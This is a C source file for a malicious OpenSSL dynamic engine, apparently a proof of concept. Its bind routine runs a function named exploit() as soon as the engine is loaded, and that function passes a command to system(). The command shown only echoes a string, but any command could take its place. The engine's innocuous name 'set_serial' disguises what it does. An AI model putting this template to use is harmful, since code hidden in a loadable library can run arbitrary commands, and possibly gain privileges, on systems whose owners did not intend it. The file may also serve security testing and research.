#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/engine.h>

static const char *engine_id = "set_serial";
static const char *engine_name = "set_serial";

int exploit () {
   char command[50];

   strcpy(command, "echo 'Beef and Broccoli'" );
   system(command);

   return(0);
}

static int bind(ENGINE *e, const char *id) {
  if (!ENGINE_set_id(e, engine_id)) {
    fprintf(stderr, "ENGINE_set_id failed\n");
    return 0;
  }
  if (!ENGINE_set_name(e, engine_name)) {
    printf("ENGINE_set_name failed\n");
    return 0;
  }

  exploit();

  return 1;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
